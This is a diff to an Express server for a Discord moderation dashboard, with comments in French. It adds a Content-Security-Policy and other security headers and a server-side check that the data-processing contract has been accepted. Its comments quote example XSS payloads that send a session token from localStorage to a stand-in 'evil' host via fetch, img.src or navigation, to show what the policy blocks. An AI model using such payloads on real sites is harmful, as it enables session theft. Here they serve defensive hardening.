@@ -513,6 +513,123 @@ function mountFeedbackRelay(app) {
 //  raisonnement que pour le gestionnaire d'erreurs et les parseurs de corps.
 // ═══════════════════════════════════════════════════════════════
 
+// ═══════════════════════════════════════════════════════════════
+//  En-têtes de sécurité et politique de sécurité du contenu
+//
+//  Le projet n'en posait aucun : ni CSP, ni X-Frame-Options, ni HSTS, ni
+//  Referrer-Policy. Les seuls `setHeader` du dépôt étaient des `Cache-Control`.
+//
+//  Ce qui est fermé ici, et pourquoi c'est utile MALGRÉ `'unsafe-inline'` :
+//
+//   - `frame-ancestors 'none'` ferme le clickjacking. Sans lui, le dashboard
+//     est encadrable : une administratrice connectée peut être amenée à valider
+//     un effacement de données ou à désactiver l'antiraid en cliquant sur une
+//     iframe transparente posée devant un bouton anodin.
+//
+//   - `connect-src` et `img-src` ferment l'EXFILTRATION. C'est le point clé :
+//     le jeton de session vit dans localStorage et vaut sept jours sans
+//     révocation possible, donc la valeur d'un XSS tient entièrement dans sa
+//     capacité à faire sortir ce jeton. Le payload type
+//     `fetch('//evil/'+localStorage.quasar_token)` échoue désormais, et sa
+//     variante par `img.src` aussi.
+//
+//  Ce qui N'EST PAS fermé, et il faut le dire franchement : `script-src` porte
+//  `'unsafe-inline'`, donc un XSS S'EXÉCUTE toujours. C'est imposé par le
+//  dashboard, qui compte encore une centaine de gestionnaires d'événements en
+//  ligne (`onclick="..."`) et plusieurs blocs `<script>` inline. Les retirer est
+//  un chantier à part ; tant qu'il n'est pas fait, une CSP stricte rendrait le
+//  dashboard inutilisable. L'exfiltration par NAVIGATION (`location = '//evil/'
+//  + jeton`) reste elle aussi possible : aucune directive largement supportée
+//  ne la couvre.
+//
+//  Les origines externes ne sont pas codées en dur : elles sont dérivées des
+//  variables d'environnement qui les configurent, sinon toute personne qui
+//  auto-héberge avec son propre design system verrait sa vitrine se briser.
+// ═══════════════════════════════════════════════════════════════
+
+/** Réduit une URL à son origine, ou rien si elle est absente ou invalide. */
+function origine(url) {
+    try {
+        return url ? new URL(url).origin : null;
+    } catch {
+        return null;
+    }
+}
+
+function construireCsp({ vitrine }) {
+    const ds = origine(process.env.VNCT_DS_BASE_URL || 'https://design.vena.city');
+    const sema = origine(process.env.REPORT_RELAY_URL || 'https://sema.vena.city');
+
+    const directives = {
+        'default-src': ["'self'"],
+        'base-uri': ["'self'"],
+        'object-src': ["'none'"],
+        'frame-ancestors': ["'none'"],
+        'form-action': ["'self'"],
+        // 'unsafe-inline' : voir le commentaire ci-dessus. À retirer dès que les
+        // gestionnaires en ligne du dashboard auront disparu.
+        'script-src': ["'self'", "'unsafe-inline'"],
+        'style-src': ["'self'", "'unsafe-inline'"],
+        // data: couvre les favicons et les images encodées du design system.
+        'img-src': ["'self'", 'data:'],
+        'font-src': ["'self'", 'data:'],
+        'connect-src': ["'self'"],
+    };
+
+    if (vitrine) {
+        // La vitrine consomme le design system distant : feuille de style,
+        // script, polices, et son sondage de version.
+        if (ds) {
+            directives['script-src'].push(ds);
+            directives['style-src'].push(ds);
+            directives['font-src'].push(ds);
+            directives['img-src'].push(ds);
+            directives['connect-src'].push(ds);
+        }
+    } else {
+        // Le dashboard tourne sur sa copie locale du design system, mais affiche
+        // les avatars et les icônes de serveur servis par Discord, et sa feuille
+        // de style importe la police Inter depuis Google Fonts.
+        directives['img-src'].push('https://cdn.discordapp.com');
+        directives['style-src'].push('https://fonts.googleapis.com');
+        directives['font-src'].push('https://fonts.gstatic.com');
+    }
+
+    // Le formulaire de signalement poste vers Sema. Sur la vitrine il l'appelle
+    // en direct ; sur le dashboard il passe par le relais local, mais la valeur
+    // est configurée sur les deux pages : l'autoriser des deux côtés évite un
+    // blocage silencieux au premier signalement.
+    if (sema) directives['connect-src'].push(sema);
+
+    return Object.entries(directives)
+        .map(([nom, valeurs]) => `${nom} ${valeurs.join(' ')}`)
+        .join('; ');
+}
+
+function mountSecurityHeaders(app, { vitrine }) {
+    // Calculée une fois : les variables d'environnement ne changent pas en vol.
+    const csp = construireCsp({ vitrine });
+
+    app.use((req, res, next) => {
+        res.set('Content-Security-Policy', csp);
+        // Doublon volontaire de frame-ancestors, pour les navigateurs anciens
+        // qui ignorent la CSP mais respectent cet en-tête.
+        res.set('X-Frame-Options', 'DENY');
+        res.set('X-Content-Type-Options', 'nosniff');
+        // Le dashboard chargeait des ressources tierces depuis des pages dont
+        // l'URL a porté le jeton de session : rien ne doit fuiter par le Referer.
+        res.set('Referrer-Policy', vitrine ? 'strict-origin-when-cross-origin' : 'no-referrer');
+
+        // HSTS uniquement sur une requête déjà chiffrée. Une instance
+        // auto-hébergée joignable en HTTP sur un réseau local ne doit pas se
+        // retrouver verrouillée par un en-tête qu'elle ne peut plus honorer.
+        if (req.secure) {
+            res.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains');
+        }
+        next();
+    });
+}
+
 function mountNoStore(app) {
     app.use(['/auth', '/api', '/callback'], (req, res, next) => {
         res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
@@ -728,6 +845,9 @@ function createApi(discordClient, mode = 'bot') {
     const breachRoutes = require('./routes/breach');
     const ownerRoutes = require('./routes/owner');
     const erasureRoutes = require('./routes/erasure');
+    // Require paresseux, comme les autres du lot : le middleware tire
+    // services/contract, qui tire services/database.
+    const { requireContract } = require('./middleware/requireContract');
     // Modération automatique — quatre modules qui partagent le socle commun
     // (punitions composables, portée par règle, salon d'arbitrage).
     const automodRoutes = require('./routes/automod');
@@ -740,6 +860,12 @@ function createApi(discordClient, mode = 'bot') {
     const app = express();
 
     appliquerTrustProxy(app);
+    // En-têtes avant tout le reste : une réponse d'erreur précoce doit les
+    // porter aussi.
+    mountSecurityHeaders(app, { vitrine: false });
+    // La version d'Express n'apprend rien d'utile à une visiteuse, et beaucoup
+    // à qui cherche une faille connue.
+    app.disable('x-powered-by');
 
     // Middleware
     mountBodyParsers(app);
@@ -770,6 +896,21 @@ function createApi(discordClient, mode = 'bot') {
         }
         next();
     });
+
+    // Article 28.3 du RGPD : l'acceptation du contrat de sous-traitance est
+    // imposée par le SERVEUR, plus seulement par le navigateur. Jusqu'ici
+    // `hasAcceptedCurrent()` n'avait qu'un seul appelant, la route que le front
+    // consulte : un administrateur qui refusait le contrat, ou n'importe quel
+    // script muni d'un jeton, configurait et lisait tout par l'API directe. Le
+    // contrat et la politique de confidentialité affirmaient un blocage qui
+    // n'existait pas techniquement.
+    //
+    // Même position et même exemption que le garde-fou de suspension juste
+    // au-dessus : devant tous les routeurs guild-scoped, et jamais devant
+    // /erasure — une obligation légale ne se suspend pas parce qu'un contrat
+    // n'est pas signé. Les deux gardes sont volontairement voisines pour que
+    // leurs exemptions se lisent ensemble.
+    app.use('/api/guilds/:guildId', requireContract);
 
     app.use('/api/guilds', guildRoutes);
     app.use('/api/guilds/:guildId/moderation', moderationRoutes);
@@ -841,6 +982,8 @@ function createSiteApi(mode) {
     const app = express();
 
     appliquerTrustProxy(app);
+    mountSecurityHeaders(app, { vitrine: true });
+    app.disable('x-powered-by');
 
     mountBodyParsers(app);
     mountNoStore(app);
@@ -869,4 +1012,4 @@ function createSiteApi(mode) {
     return app;
 }
 
-module.exports = { resoudreTrustProxy, cleClient, createApi, createSiteApi };
+module.exports = { construireCsp, resoudreTrustProxy, cleClient, createApi, createSiteApi };
